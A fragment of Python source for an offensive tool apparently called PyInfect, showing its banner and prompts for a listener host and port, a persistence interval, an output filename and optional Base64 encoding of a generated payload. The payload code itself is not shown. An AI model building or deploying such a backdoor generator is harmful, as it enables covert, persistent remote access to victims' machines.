...
try:
    ...
    print(WHITE)
    print(YELLOW+"  _____       "+RED+" _____        __          _   ")
    print(YELLOW+" |  __ \      "+RED+"|_   _|      / _|        | |  ")
    print(YELLOW+" | |__) |   _ "+RED+"  | |  _ __ | |_ ___  ___| |_ ")
    print(YELLOW+" |  ___/ | | |"+RED+"  | | | '_ \|  _/ _ \/ __| __|")
    print(YELLOW+" | |   | |_| |"+RED+" _| |_| | | | ||  __/ (__| |_ ")
    print(YELLOW+" |_|    \__, |"+RED+"|_____|_| |_|_| \___|\___|\__|")
    print(YELLOW+"         __/ |")
    print(YELLOW+"        |___/  ")
    print("")
    ...
    hostChoice = input(CYAN+"Set LHOST (Leave blank for "+lhost+"): "+GREEN)
    if hostChoice == "":
    	hostChoice = lhost
    portChoice = input(CYAN+"Set LPORT (Leave blank for "+str(lport)+"): "+GREEN)
    if portChoice == "":
    	portChoice = lport
    print("")
    interval = input(CYAN+"Persistence Interval (Leave blank for 60sec) [1-86400]: "+GREEN)
    if interval == "":
    	interval = "60"
    print("")
    filename = input(CYAN+"Filename (example.py): "+GREEN)
    
    if ".py" not in filename:
    	filename = filename + ".py"
    
    encode = input(CYAN+"Encode to Base64? [Y/N]: "+GREEN)
    print("")
